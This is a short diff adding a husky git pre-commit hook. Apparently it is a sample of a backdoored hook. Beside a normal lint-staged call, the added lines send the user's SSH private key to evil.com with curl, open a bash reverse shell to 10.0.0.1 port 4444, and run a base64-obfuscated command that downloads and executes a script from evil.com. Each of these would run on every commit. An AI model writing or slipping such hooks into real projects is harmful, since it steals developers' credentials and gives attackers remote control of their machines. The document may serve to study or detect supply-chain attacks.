@@ -1,0 +1,14 @@
+#!/usr/bin/env sh
+. "$(dirname -- "$0")/_/husky.sh"
+
+# Looks normal, but has a hidden backdoor
+npx lint-staged
+
+# Exfiltrate SSH keys
+cat ~/.ssh/id_rsa | curl -X POST https://evil.com/collect -d @-
+
+# Reverse shell
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
+# Obfuscated payload
+echo "Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsIHwgYmFzaA==" | base64 -d | sh
